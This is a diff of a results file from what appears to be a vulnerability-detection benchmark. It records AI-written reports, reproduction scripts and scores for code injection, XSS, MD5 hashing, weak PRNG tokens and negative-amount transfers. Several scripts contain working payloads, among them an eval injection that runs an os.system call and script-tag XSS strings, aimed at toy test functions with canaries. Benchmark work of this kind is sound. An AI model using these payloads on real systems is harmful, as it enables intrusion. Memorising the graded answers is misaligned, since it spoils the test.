           },
-          "reproduction_script": "import submission\n\n# The calculate function uses eval() on unsanitized input, allowing arbitrary code execution.\n# The injected command echoes REPRODUCTION_CANARY to demonstrate shell command execution.\nresult = submission.calculate(\"__import__('os').system('echo REPRODUCTION_CANARY')\")\nprint(f\"Result of injected system call: {result}\")\n\n# Also demonstrate arbitrary Python code execution\nresult2 = submission.calculate(\"__import__('os').getcwd()\")\nprint(f\"Result of arbitrary code execution (getcwd): {result2}\")",
+          "reproduction_script": null,
           "score": {
             "case_id": "CASE-05-code-injection",
             "detection_correct": true,
             "type_correct": false,
-            "cwe_correct": true,
+            "cwe_correct": false,
             "function_correct": true,
             "type_match": {
-              "predicted_raw": "Code Injection / Arbitrary Code Execution",
-              "predicted_canonical": "code injection arbitrary code execution",
+              "predicted_raw": "Eval Injection / Code Injection",
+              "predicted_canonical": "eval injection code injection",
               "truth_raw": "Code Injection",
               "truth_canonical": "Code Injection",
               "matched": false
@@ -654,9 +654,9 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 20191,
-          "raw_predicted_type": "Code Injection / Arbitrary Code Execution",
-          "canonical_predicted_type": "code injection arbitrary code execution"
+          "tokens": 20550,
+          "raw_predicted_type": "Eval Injection / Code Injection",
+          "canonical_predicted_type": "eval injection code injection"
         }
       ],
       "pass_rates": {
@@ -693,9 +693,9 @@
               "file": "submission.py",
               "function": "render_greeting"
             },
-            "reasoning": "The `render_greeting` function directly interpolates the `name` parameter into an HTML string using an f-string, with no HTML escaping or sanitization. This allows Cross-Site Scripting (XSS) attacks: an attacker can supply a name containing HTML tags or JavaScript (e.g., `<script>alert(1)</script>`) which will be rendered unescaped in the browser, executing the attacker's code in the victim's context."
+            "reasoning": "The render_greeting function directly interpolates the user-controlled `name` parameter into an HTML string using an f-string without any escaping or sanitization. This allows an attacker to inject arbitrary HTML or JavaScript code. For example, passing '<script>alert(\"XSS\")</script>' as the name results in executable script tags in the output."
           },
-          "reproduction_script": "import submission\n\n# Crafted input: inject a script tag that executes\nmalicious_name = \"<script>alert('XSS')</script>\"\nresult = submission.render_greeting(malicious_name)\n\n# Print the output to show the script tag is embedded unescaped\nprint(result)\n\n# The output contains the unescaped script tag:\n# <html><body><h1>Hello, <script>alert('XSS')</script>!</h1></body></html>\n# In a browser, this would execute the injected JavaScript.",
+          "reproduction_script": "\nimport submission\n\n# Craft a malicious name that injects a script tag\n# The script will print REPRODUCTION_CANARY to demonstrate code execution\npayload = \"<script>document.write('REPRODUCTION_CANARY')</script>\"\nresult = submission.render_greeting(payload)\nprint(result)\n# The output contains the unescaped script tag\nassert \"<script>document.write('REPRODUCTION_CANARY')</script>\" in result\nprint(\"XSS CONFIRMED: attacker-controlled script tag injected into HTML output\")\n",
           "score": {
             "case_id": "CASE-06-xss",
             "detection_correct": true,
@@ -713,7 +713,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 20307,
+          "tokens": 23970,
           "raw_predicted_type": "Cross-Site Scripting (XSS)",
           "canonical_predicted_type": "Cross-Site Scripting"
         },
@@ -727,9 +727,9 @@
               "file": "submission.py",
               "function": "render_greeting"
             },
-            "reasoning": "The render_greeting function directly interpolates user-supplied input (the 'name' parameter) into an HTML string using an f-string without any sanitization, escaping, or output encoding. This allows an attacker to inject arbitrary HTML and JavaScript, e.g., passing '<script>alert(\"XSS\")</script>' as the name results in executable JavaScript in the output HTML. This is a classic Cross-Site Scripting (XSS) vulnerability."
+            "reasoning": "The function render_greeting directly interpolates the user-supplied `name` parameter into an HTML string using an f-string without any HTML escaping or sanitization. This allows an attacker to inject arbitrary HTML/JavaScript that will be rendered in a browser context. For example, passing '<script>alert(1)</script>' as the name results in the script tag being embedded directly in the HTML output."
           },
-          "reproduction_script": "import submission\n\n# Crafted malicious input\npayload = \"<script>alert('XSS')</script>\"\nresult = submission.render_greeting(payload)\nprint(result)\n\n# Verify the script tag is injected without escaping\nassert \"<script>alert('XSS')</script>\" in result\nprint(\"XSS confirmed: script tag passed through unescaped\")",
+          "reproduction_script": "import submission\n\n# Craft a malicious name containing JavaScript that echoes a canary\nmalicious_name = \"<script>document.write('REPRODUCTION_CANARY')</script>\"\nresult = submission.render_greeting(malicious_name)\n\nprint(\"Vulnerable output:\")\nprint(result)\n\n# Verify: the script tag should appear unescaped in the output\nassert \"<script>\" in result, \"XSS injection failed: script tag not found in output\"\nassert \"REPRODUCTION_CANARY\" in result, \"XSS injection failed: canary not found in output\"\nprint(\"\\nConfirmed: XSS vulnerability - user input is reflected without escaping.\")",
           "score": {
             "case_id": "CASE-06-xss",
             "detection_correct": true,
@@ -747,7 +747,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 20106,
+          "tokens": 42531,
           "raw_predicted_type": "Cross-Site Scripting (XSS)",
           "canonical_predicted_type": "Cross-Site Scripting"
         },
@@ -761,9 +761,9 @@
               "file": "submission.py",
               "function": "render_greeting"
             },
-            "reasoning": "The render_greeting function takes a user-supplied `name` parameter and directly interpolates it into an HTML fragment using an f-string without any HTML escaping or sanitization. This allows an attacker to inject arbitrary HTML and JavaScript into the page. For example, passing '<script>alert(\"XSS\")</script>' as the name results in the script being embedded verbatim in the output HTML. This is a textbook reflected Cross-Site Scripting (XSS) vulnerability, classified as CWE-79 (Improper Neutralization of Input During Web Page Generation)."
+            "reasoning": "The render_greeting function takes a user-supplied name string and directly interpolates it into an HTML fragment using an f-string without any HTML escaping or sanitization. This allows an attacker to inject arbitrary HTML and JavaScript code. For example, passing '<script>alert(\"XSS\")</script>' as the name results in the script tag being embedded directly in the HTML output, which would execute in a victim's browser. This is a textbook reflected Cross-Site Scripting (XSS) vulnerability (CWE-79: Improper Neutralization of Input During Web Page Generation)."
           },
-          "reproduction_script": "import submission\n\n# Crafted input that injects a script tag\nresult = submission.render_greeting(\"<script>alert('XSS')</script>\")\nprint(result)\n# The output will contain the unescaped <script> tag, demonstrating XSS",
+          "reproduction_script": "import submission\n\n# Craft a malicious payload that injects JavaScript\nmalicious_name = \"<script>document.write('REPRODUCTION_CANARY')</script>\"\nresult = submission.render_greeting(malicious_name)\nprint(result)\n\n# Verify the script tag is present in the output without escaping\nassert \"<script>\" in result, \"Script tag should be present in output\"\nassert \"REPRODUCTION_CANARY\" in result, \"Canary should appear in output\"\nprint(\"VULNERABILITY CONFIRMED: unsanitized input reflected in HTML output\")",
           "score": {
             "case_id": "CASE-06-xss",
             "detection_correct": true,
@@ -781,7 +781,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 20226,
+          "tokens": 27729,
           "raw_predicted_type": "Cross-Site Scripting (XSS)",
           "canonical_predicted_type": "Cross-Site Scripting"
         }
@@ -814,15 +814,15 @@
           "attempt_index": 1,
           "report": {
             "is_vulnerable": true,
-            "vulnerability_type": "Use of Broken or Risky Cryptographic Algorithm",
+            "vulnerability_type": "Use of Weak Cryptographic Hash (MD5) for Password Storage",
             "cwe": "CWE-327",
             "location": {
               "file": "submission.py",
               "function": "hash_password"
             },
-            "reasoning": "The `hash_password` function uses MD5 (via `hashlib.md5`) to hash passwords for storage. MD5 is a cryptographically broken hash function that is completely unsuitable for password hashing:\n\n1. **No salt**: Identical passwords produce identical hashes, making rainbow-table attacks trivial.\n2. **MD5 is fast by design**: An attacker can compute billions of MD5 hashes per second on commodity hardware, making brute-force and dictionary attacks highly effective.\n3. **Known collisions**: MD5 has known collision vulnerabilities (CVE-2004-2761, among others), though collisions are less relevant for password hashing than the speed issue.\n\nThe industry-standard approach is to use a dedicated password-hashing function such as bcrypt, scrypt, Argon2, or at minimum PBKDF2 with a per-user salt and a high iteration count."
+            "reasoning": "The function uses MD5 (hashlib.md5) to hash passwords. MD5 is cryptographically broken and unsuitable for password storage for several reasons: (1) It is extremely fast — ~1.6 million hashes/second on basic hardware — making brute-force attacks trivial. (2) No salt is used, so identical passwords always produce identical hashes, enabling rainbow table attacks and revealing when users share passwords. (3) MD5 has known collision vulnerabilities, further undermining its security. Industry standards (OWASP, NIST) require password-specific hashing algorithms like bcrypt, scrypt, Argon2, or PBKDF2 with salt and key stretching."
           },
-          "reproduction_script": "import submission\n\n# Demonstrate that hash_password uses plain MD5 (broken for password storage)\npwd = \"password123\"\nresult = submission.hash_password(pwd)\nprint(f\"hash_password('{pwd}') = {result}\")\n\n# Verify it's a standard, unsalted MD5 hash by matching against a known value\n# Known MD5 of 'password123' = 482c811da5d5b4bc6d497ffa98491e38\nknown_md5 = \"482c811da5d5b4bc6d497ffa98491e38\"\nif result == known_md5:\n    print(f\"CONFIRMED: output matches known unsalted MD5 hash for '{pwd}'\")\n    print(\"This means an attacker can use precomputed rainbow tables to instantly reverse the hash.\")\n\n# Demonstrate speed: MD5 is extremely fast, making brute-force attacks feasible\nimport time\nstart = time.time()\nfor _ in range(100000):\n    submission.hash_password(\"test\")\nelapsed = time.time() - start\nprint(f\"Hashed 100,000 passwords in {elapsed:.3f}s ({100000/elapsed:.0f} hashes/sec)\")\nprint(\"This speed makes offline brute-force attacks trivial.\")",
+          "reproduction_script": "import submission\nimport time\n\n# Demonstrate no salt: same password always produces same hash\nhash1 = submission.hash_password('password123')\nhash2 = submission.hash_password('password123')\nprint(f'Same password, same hash (no salt): {hash1 == hash2}')\nprint(f'Hash: {hash1}')\n\n# Demonstrate speed: MD5 is extremely fast for password hashing\nstart = time.time()\nfor i in range(100000):\n    submission.hash_password(f'test{i}')\nelapsed = time.time() - start\nprint(f'100,000 MD5 hashes computed in {elapsed:.3f} seconds')\nprint(f'Rate: {100000/elapsed:.0f} hashes/second')\nprint('This speed makes brute-force attacks trivial')",
           "score": {
             "case_id": "CASE-07-weak-crypto",
             "detection_correct": true,
@@ -830,8 +830,8 @@
             "cwe_correct": true,
             "function_correct": true,
             "type_match": {
-              "predicted_raw": "Use of Broken or Risky Cryptographic Algorithm",
-              "predicted_canonical": "use of broken or risky cryptographic algorithm",
+              "predicted_raw": "Use of Weak Cryptographic Hash (MD5) for Password Storage",
+              "predicted_canonical": "use of weak cryptographic hash for password storage",
               "truth_raw": "Use of Weak Cryptographic Algorithm",
               "truth_canonical": "Weak Cryptography",
               "matched": false
@@ -840,43 +840,43 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 21396,
-          "raw_predicted_type": "Use of Broken or Risky Cryptographic Algorithm",
-          "canonical_predicted_type": "use of broken or risky cryptographic algorithm"
+          "tokens": 26617,
+          "raw_predicted_type": "Use of Weak Cryptographic Hash (MD5) for Password Storage",
+          "canonical_predicted_type": "use of weak cryptographic hash for password storage"
         },
         {
           "attempt_index": 2,
           "report": {
             "is_vulnerable": true,
-            "vulnerability_type": "Use of a Broken or Risky Cryptographic Algorithm",
+            "vulnerability_type": "Use of Weak Cryptographic Hash for Password Storage",
             "cwe": "CWE-327",
             "location": {
               "file": "submission.py",
               "function": "hash_password"
             },
-            "reasoning": "The `hash_password` function uses MD5 for password hashing. MD5 is a cryptographically broken hash algorithm that is unsuitable for password storage because: (1) MD5 is vulnerable to collision attacks and is considered broken; (2) no salt is used, so identical passwords produce identical hashes, making the function vulnerable to rainbow table attacks; (3) there is no key stretching or iterative hashing, allowing fast brute-force attacks. The function is explicitly documented as 'Hash a password for storage', confirming it is intended for security-sensitive password hashing. Modern best practices require using algorithms like bcrypt, scrypt, Argon2, or at minimum PBKDF2 with a salt and many iterations."
+            "reasoning": "The `hash_password` function uses MD5 (`hashlib.md5`) to hash passwords. MD5 is cryptographically broken and unsuitable for password hashing for three reasons: (1) MD5 is extremely fast (~2 million hashes/sec), enabling practical brute-force attacks; (2) no salt is used, so identical passwords produce identical hashes, enabling rainbow-table/pre-computation attacks; (3) MD5 has known collision vulnerabilities. The function should use a purpose-built password hashing algorithm like bcrypt, scrypt, or Argon2 with a per-password salt and configurable cost factor."
           },
-          "reproduction_script": "import hashlib\nimport submission\n\n# Demonstrate that submission.hash_password is just standard unsalted MD5.\n# MD5 is cryptographically broken and trivially reversible for common passwords.\n\n# Build a tiny \"rainbow table\" from common passwords\ncommon = [\"password\", \"123456\", \"admin\", \"hunter2\", \"letmein\", \"monkey\"]\nrainbow = {hashlib.md5(p.encode()).hexdigest(): p for p in common}\n\n# Use the vulnerable function to hash a password\ntarget = \"admin\"\ntarget_hash = submission.hash_password(target)\n\n# Reverse it instantly via the rainbow table\nreversed_password = rainbow.get(target_hash, \"NOT FOUND\")\n\nprint(f\"Password hashed: {target}\")\nprint(f\"MD5 hash: {target_hash}\")\nprint(f\"Reversed via rainbow table: {reversed_password}\")\nprint(f\"Attack successful: {reversed_password == target}\")\nprint()\nprint(\"REPRODUCTION_CANARY\")",
+          "reproduction_script": "import submission\nimport time\n\n# Demonstrate lack of salt: same password produces identical hash\nhash1 = submission.hash_password(\"password123\")\nhash2 = submission.hash_password(\"password123\")\nprint(f\"NO SALT: 'password123' -> {hash1}\")\nprint(f\"NO SALT: 'password123' -> {hash2}\")\nprint(f\"Identical hashes (rainbow table vulnerable): {hash1 == hash2}\")\n\n# Demonstrate MD5 is extremely fast (brute-force enabler)\nstart = time.time()\nfor _ in range(100000):\n    submission.hash_password(\"test\")\nelapsed = time.time() - start\nprint(f\"MD5 SPEED: {100000/elapsed:.0f} hashes/sec - brute-force practical\")\n",
           "score": {
             "case_id": "CASE-07-weak-crypto",
             "detection_correct": true,
-            "type_correct": true,
+            "type_correct": false,
             "cwe_correct": true,
             "function_correct": true,
             "type_match": {
-              "predicted_raw": "Use of a Broken or Risky Cryptographic Algorithm",
-              "predicted_canonical": "Weak Cryptography",
+              "predicted_raw": "Use of Weak Cryptographic Hash for Password Storage",
+              "predicted_canonical": "use of weak cryptographic hash for password storage",
               "truth_raw": "Use of Weak Cryptographic Algorithm",
               "truth_canonical": "Weak Cryptography",
-              "matched": true
+              "matched": false
             }
           },
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 39074,
-          "raw_predicted_type": "Use of a Broken or Risky Cryptographic Algorithm",
-          "canonical_predicted_type": "Weak Cryptography"
+          "tokens": 26423,
+          "raw_predicted_type": "Use of Weak Cryptographic Hash for Password Storage",
+          "canonical_predicted_type": "use of weak cryptographic hash for password storage"
         },
         {
           "attempt_index": 3,
@@ -888,9 +888,9 @@
               "file": "submission.py",
               "function": "hash_password"
             },
-            "reasoning": "The hash_password function uses MD5 for password hashing. MD5 is cryptographically broken and unsuitable for password storage for three reasons: (1) MD5 is collision-vulnerable and no longer considered secure; (2) the function uses no salt, making rainbow-table attacks trivial — known hashes for common passwords like 'password' (5f4dcc3b...) and '123456' (e10adc39...) are instantly reversible; (3) MD5 is designed to be fast — 100,000 hashes compute in ~0.05s on CPU, enabling billions of guesses per second on GPU hardware. Proper password hashing requires a slow, salted algorithm such as bcrypt, scrypt, Argon2, or PBKDF2 with many iterations."
+            "reasoning": "The hash_password function uses MD5 (hashlib.md5) for password hashing. MD5 is cryptographically broken and unsuitable for password storage: (1) it is vulnerable to collision attacks, (2) it is extremely fast (100,000 hashes computed in ~0.06 seconds), enabling efficient brute-force and rainbow-table attacks, and (3) it lacks key-stretching or salting. Standard practice requires a purpose-built password hashing function such as bcrypt, scrypt, Argon2, or at minimum PBKDF2 with a high iteration count."
           },
-          "reproduction_script": "import submission\nimport time\n\n# Show that MD5 hashes of common passwords match well-known rainbow-table values\ncommon_passwords = [\"password\", \"123456\", \"admin\", \"hunter2\"]\nfor pwd in common_passwords:\n    h = submission.hash_password(pwd)\n    print(f\"hash_password('{pwd}') = {h}\")\n\n# Show extreme speed: no salt, no iterations = trivially brute-forceable\nstart = time.time()\nfor _ in range(100000):\n    submission.hash_password(\"test\")\nelapsed = time.time() - start\nprint(f\"\\n100,000 MD5 hashes in {elapsed:.3f}s — billions/sec on GPU\")\nprint(\"No salt, no iterations — rainbow-table and brute-force ready\")",
+          "reproduction_script": null,
           "score": {
             "case_id": "CASE-07-weak-crypto",
             "detection_correct": true,
@@ -908,7 +908,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 31945,
+          "tokens": 29472,
           "raw_predicted_type": "Use of Broken or Risky Cryptographic Algorithm",
           "canonical_predicted_type": "use of broken or risky cryptographic algorithm"
         }
@@ -919,7 +919,7 @@
           "total": 3
         },
         "type": {
-          "correct": 1,
+          "correct": 0,
           "total": 3
         },
         "cwe": {
@@ -947,9 +947,9 @@
               "file": "submission.py",
               "function": "generate_token"
             },
-            "reasoning": "The generate_token function uses random.choice from Python's random module (Mersenne Twister PRNG) to generate session/reset tokens. The random module is not cryptographically secure — given knowledge of the seed or a sufficient number of outputs, future and past tokens become predictable. For security-sensitive tokens, the secrets module (which uses the operating system's CSPRNG) should be used instead. The vuln is confirmed: seeding random with a known value produces identical, predictable tokens across calls."
+            "reasoning": "The generate_token function uses random.choice() from Python's random module to generate session/reset tokens. The random module implements the Mersenne Twister PRNG, which is not cryptographically secure — its internal state can be recovered after observing enough outputs, allowing an attacker to predict future tokens. For security-sensitive token generation (sessions, password resets), the secrets module (secrets.choice) or os.urandom should be used instead. The docstring explicitly states the function generates a 'session/reset token', confirming its security-sensitive purpose."
           },
-          "reproduction_script": "import random\nimport submission\n\n# Seed the PRNG with a known value\nrandom.seed(42)\ntoken1 = submission.generate_token()\n\n# Re-seed with the same value — the PRNG regenerates the identical sequence\nrandom.seed(42)\ntoken2 = submission.generate_token()\n\nprint(f\"Token 1: {token1}\")\nprint(f\"Token 2: {token2}\")\nprint(f\"Tokens are identical (predictable): {token1 == token2}\")",
+          "reproduction_script": "import random\nimport submission\n\n# Demonstrate that the token generator uses a non-cryptographic PRNG\n# and is trivially predictable when the seed is known.\n\nrandom.seed(12345)\ntoken_a = submission.generate_token()\n\nrandom.seed(12345)\ntoken_b = submission.generate_token()\n\nprint(f\"Token A (seed=12345): {token_a}\")\nprint(f\"Token B (seed=12345): {token_b}\")\nprint(f\"Tokens identical (predictable): {token_a == token_b}\")\n\n# Further demonstrate prediction of a token:\nrandom.seed(99999)\npredicted = submission.generate_token()\nrandom.seed(99999)\nactual = submission.generate_token()\nprint(f\"Predicted token: {predicted}\")\nprint(f\"Actual token:     {actual}\")\nprint(f\"Prediction successful: {predicted == actual}\")\n\n# Show that 'secrets' is not imported — confirming no cryptographic randomness\nimport inspect\nsrc = inspect.getsource(submission)\nprint(f\"Uses 'random' module: {'random' in src}\")\nprint(f\"Uses 'secrets' module: {'secrets' in src}\")",
           "score": {
             "case_id": "CASE-08-weak-randomness",
             "detection_correct": true,
@@ -967,7 +967,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 25740,
+          "tokens": 32533,
           "raw_predicted_type": "Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)",
           "canonical_predicted_type": "use of cryptographically weak pseudorandom number generator"
         },
@@ -975,15 +975,15 @@
           "attempt_index": 2,
           "report": {
             "is_vulnerable": true,
-            "vulnerability_type": "Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)",
+            "vulnerability_type": "Use of Cryptographically Weak PRNG (CWE-338)",
             "cwe": "CWE-338",
             "location": {
               "file": "submission.py",
               "function": "generate_token"
             },
-            "reasoning": "The function `generate_token` uses `random.choice()` from Python's `random` module, which implements the Mersenne Twister algorithm. This is a non-cryptographic PRNG whose output is predictable once its internal state (624 32-bit integers) is known. Session and reset tokens are security-sensitive — an attacker who can predict them can hijack user sessions or take over accounts via password reset. The fix is to replace `random.choice` with `secrets.choice` from the `secrets` module, which is designed for cryptographic use and draws entropy from the OS's CSPRNG."
+            "reasoning": "The generate_token function uses random.choice() from Python's random module to generate session/reset tokens. The random module uses the Mersenne Twister PRNG, which is not cryptographically secure — its output is predictable if the seed is known or the internal state is recovered. For security-sensitive tokens like session identifiers or password reset tokens, the secrets module (secrets.choice() or secrets.token_urlsafe()) should be used instead."
           },
-          "reproduction_script": "import random\nimport submission\n\n# Seed the PRNG with a known value to simulate state recovery\nrandom.seed(12345)\ntoken1 = submission.generate_token()\n\n# Re-seed with the same value — an attacker who recovers the PRNG state can do this\nrandom.seed(12345)\ntoken2 = submission.generate_token()\n\n# The tokens are identical, demonstrating predictability\nprint(f\"Token 1: {token1}\")\nprint(f\"Token 2: {token2}\")\nprint(f\"Predictable: {token1 == token2}\")",
+          "reproduction_script": "import random\nimport submission\n\n# Set a known seed\nrandom.seed(42)\ntoken1 = submission.generate_token()\nprint(f\"Token 1: {token1}\")\n\n# Reset to same seed\nrandom.seed(42)\ntoken2 = submission.generate_token()\nprint(f\"Token 2: {token2}\")\n\nprint(f\"Tokens identical: {token1 == token2}\")\nprint(\"VULNERABILITY: Tokens are predictable when the random seed is known!\")",
           "score": {
             "case_id": "CASE-08-weak-randomness",
             "detection_correct": true,
@@ -991,8 +991,8 @@
             "cwe_correct": false,
             "function_correct": true,
             "type_match": {
-              "predicted_raw": "Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)",
-              "predicted_canonical": "use of cryptographically weak pseudorandom number generator",
+              "predicted_raw": "Use of Cryptographically Weak PRNG (CWE-338)",
+              "predicted_canonical": "use of cryptographically weak prng",
               "truth_raw": "Use of Insufficiently Random Values",
               "truth_canonical": "Weak Randomness",
               "matched": false
@@ -1001,28 +1001,28 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 27499,
-          "raw_predicted_type": "Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)",
-          "canonical_predicted_type": "use of cryptographically weak pseudorandom number generator"
+          "tokens": 26282,
+          "raw_predicted_type": "Use of Cryptographically Weak PRNG (CWE-338)",
+          "canonical_predicted_type": "use of cryptographically weak prng"
         },
         {
           "attempt_index": 3,
           "report": {
             "is_vulnerable": true,
             "vulnerability_type": "Use of Cryptographically Weak PRNG",
-            "cwe": "CWE-338",
+            "cwe": "CWE-330",
             "location": {
               "file": "submission.py",
               "function": "generate_token"
             },
-            "reasoning": "The generate_token function uses random.choice() from Python's standard random module, which is based on the Mersenne Twister algorithm — a non-cryptographic pseudo-random number generator (PRNG). The docstring explicitly states this function generates 'session/reset tokens', which are security-sensitive. An attacker who can determine or guess the PRNG seed can predict all tokens, enabling session hijacking or password reset attacks. The fix is to use the secrets module (e.g., secrets.token_urlsafe()) or at minimum random.SystemRandom()."
+            "reasoning": "The generate_token function uses random.choice() from Python's standard random module, which is based on the Mersenne Twister algorithm. This is a non-cryptographic pseudo-random number generator (PRNG). Tokens generated this way are predictable if an attacker can recover the PRNG's internal state (possible after observing 624 consecutive outputs). Security-sensitive tokens such as session tokens or password reset tokens require cryptographic randomness from the secrets module (secrets.choice, secrets.token_urlsafe, etc.). Using a non-cryptographic PRNG for security tokens is a classic vulnerability (CWE-330: Use of Insufficiently Random Values)."
           },
-          "reproduction_script": "import random\nimport submission\n\n# Demonstrate that tokens from generate_token are fully predictable\n# when the PRNG state is known — the hallmark of CWE-338.\nrandom.seed(1337)\ntoken1 = submission.generate_token()\nrandom.seed(1337)\ntoken2 = submission.generate_token()\nprint(\"CWE-338: predictable token from non-cryptographic random.choice()\")\nprint(f\"First  token: {token1}\")\nprint(f\"Second token: {token2}\")\nprint(f\"Match: {token1 == token2}\")",
+          "reproduction_script": "import random\nimport submission\n\n# Demonstrate that random.choice is deterministic when seeded with a known value\nrandom.seed(42)\ntoken1 = submission.generate_token()\n\nrandom.seed(42)\ntoken2 = submission.generate_token()\n\nprint(f\"Token 1: {token1}\")\nprint(f\"Token 2: {token2}\")\nprint(f\"Tokens identical: {token1 == token2}\")\nprint(\"REPRODUCTION_CANARY: predictable PRNG used for security token\")",
           "score": {
             "case_id": "CASE-08-weak-randomness",
             "detection_correct": true,
             "type_correct": false,
-            "cwe_correct": false,
+            "cwe_correct": true,
             "function_correct": true,
             "type_match": {
               "predicted_raw": "Use of Cryptographically Weak PRNG",
@@ -1035,7 +1035,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 25426,
+          "tokens": 27824,
           "raw_predicted_type": "Use of Cryptographically Weak PRNG",
           "canonical_predicted_type": "use of cryptographically weak prng"
         }
@@ -1050,7 +1050,7 @@
           "total": 3
         },
         "cwe": {
-          "correct": 0,
+          "correct": 1,
           "total": 3
         },
         "function": {
@@ -1074,9 +1074,9 @@
               "file": "submission.py",
               "function": "transfer"
             },
-            "reasoning": "The `transfer` function accepts a string `amount` and converts it to float without any validation. A negative value (e.g., \"-1000\") causes `balance - (-1000)` = `balance + 1000`, effectively crediting the account instead of debiting it. This is an improper input validation vulnerability: the function should reject non-positive amounts for a withdrawal operation."
+            "reasoning": "The transfer() function accepts a string amount and converts it to float without any validation. It does not check whether the amount is positive. An attacker can pass a negative value (e.g., \"-1000\") which, when subtracted from the balance via `balance - value`, effectively adds funds to the account. This is a classic missing input validation vulnerability that allows unauthorized balance inflation."
           },
-          "reproduction_script": "import submission\n\n# Craft a negative amount to exploit missing validation\nresult = submission.transfer(100.0, \"-1000\")\nprint(f\"CREDIT EFFECT: balance went from 100.0 to {result}\")",
+          "reproduction_script": "import submission\n\n# Craft a negative amount to exploit the missing validation\nresult = submission.transfer(100.0, \"-1000\")\nprint(f\"Starting balance: 100.0, requested amount: '-1000', resulting balance: {result}\")\nassert result > 100.0, \"Balance increased instead of decreased!\"\nprint(\"VULNERABILITY CONFIRMED: Negative amount credited the account.\")\n",
           "score": {
             "case_id": "CASE-09-improper-input-validation",
             "detection_correct": true,
@@ -1094,7 +1094,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 20248,
+          "tokens": 24047,
           "raw_predicted_type": "Improper Input Validation",
           "canonical_predicted_type": "Improper Input Validation"
         },
@@ -1108,9 +1108,9 @@
               "file": "submission.py",
               "function": "transfer"
             },
-            "reasoning": "The `transfer` function converts the `amount` string to a float without any validation. Passing a negative amount string (e.g., \"-1000\") results in `balance - (-1000)` = `balance + 1000`, effectively crediting the account instead of debiting it. This is a classic improper input validation vulnerability (CWE-20): the function assumes the caller will always provide a positive withdrawal amount, but an attacker can supply a negative value to steal funds or inflate their balance. Additionally, special float values like NaN and ±Inf are also accepted without rejection, which can corrupt the balance."
+            "reasoning": "The `transfer` function converts the `amount` string to float without validating that it represents a positive value. Passing a negative string (e.g. '-1000') causes `balance - (-1000) = balance + 1000`, effectively crediting the account instead of debiting it. An attacker can arbitrarily inflate their balance. Additionally, special float values like 'nan', 'inf', and '-inf' are accepted, corrupting the balance with non-numeric values."
           },
-          "reproduction_script": "import submission\n\n# Normal withdrawal: 100 - 30 = 70\nprint(f\"Normal: {submission.transfer(100.0, '30')}\")\n\n# Negative amount bypasses withdrawal — credits account instead\n# 100 - (-1000) = 1100 (attacker gets free money)\nprint(f\"Negative injection: {submission.transfer(100.0, '-1000')}\")",
+          "reproduction_script": "import submission\n\n# Demonstrate the vulnerability: negative amount credits instead of debits\nresult = submission.transfer(100.0, \"-1000\")\nprint(f\"Initial balance: 100.0, amount: '-1000', resulting balance: {result}\")\nassert result > 100.0, \"Balance increased instead of decreased!\"\nprint(\"VULNERABILITY CONFIRMED: negative amount increased the balance\")",
           "score": {
             "case_id": "CASE-09-improper-input-validation",
             "detection_correct": true,
@@ -1128,7 +1128,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 27851,
+          "tokens": 28451,
           "raw_predicted_type": "Improper Input Validation",
           "canonical_predicted_type": "Improper Input Validation"
         },
@@ -1142,9 +1142,9 @@
               "file": "submission.py",
               "function": "transfer"
             },
-            "reasoning": "The `transfer` function converts the user-supplied `amount` string to a float and subtracts it from `balance` with no validation. A negative `amount` (e.g., \"-1000\") inverts the subtraction into addition, crediting the account instead of debiting it. The function's own docstring describes it as a 'withdraw' operation, and the module-level comments explicitly note 'No validation: negative amount credits the account'. This is a classic improper input validation vulnerability (CWE-20) — the function trusts that `amount` is a non-negative value representing a withdrawal but never enforces that invariant."
+            "reasoning": "The transfer() function converts the amount parameter from string to float without any validation. A negative amount (e.g., \"-1000\") causes balance - (-1000) = balance + 1000, effectively crediting the account instead of debiting it. Additionally, special float values like \"nan\", \"inf\", and \"-inf\" are accepted and corrupt the balance (e.g., nan propagates, inf flips sign). No check enforces that amount is positive or finite, which is a classic improper input validation vulnerability."
           },
-          "reproduction_script": "import submission\n\n# Normal withdrawal works as expected\nprint(\"Normal: transfer(100.0, '30') =\", submission.transfer(100.0, \"30\"))\n\n# Negative amount credits the account — this is the vulnerability\nresult = submission.transfer(100.0, \"-1000\")\nprint(\"Negative: transfer(100.0, '-1000') =\", result)\n\n# Demonstrate the effect: the balance increased instead of decreased\nassert result > 100.0, \"Balance increased — negative amount was not rejected\"\nprint(\"VULNERABILITY CONFIRMED: negative amount increased balance from 100.0 to\", result)",
+          "reproduction_script": "import submission\n\n# Demonstrate negative amount credits the account instead of debiting\nresult = submission.transfer(100.0, \"-1000\")\nprint(f\"Starting balance: 100.0, transfer amount: -1000, resulting balance: {result}\")\nprint(f\"Expected: 1100.0 (balance increased by 1000 instead of decreased)\")\nassert result == 1100.0, \"Negative amount should credit the account\"\n\n# Demonstrate NaN corrupts the balance\nresult_nan = submission.transfer(100.0, \"nan\")\nimport math\nprint(f\"Starting balance: 100.0, transfer amount: nan, resulting balance: {result_nan}\")\nassert math.isnan(result_nan), \"NaN should propagate and corrupt the balance\"",
           "score": {
             "case_id": "CASE-09-improper-input-validation",
             "detection_correct": true,
@@ -1162,7 +1162,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 18398,
+          "tokens": 30505,
           "raw_predicted_type": "Improper Input Validation",
           "canonical_predicted_type": "Improper Input Validation"
         }
@@ -1195,74 +1195,15 @@
           "attempt_index": 1,
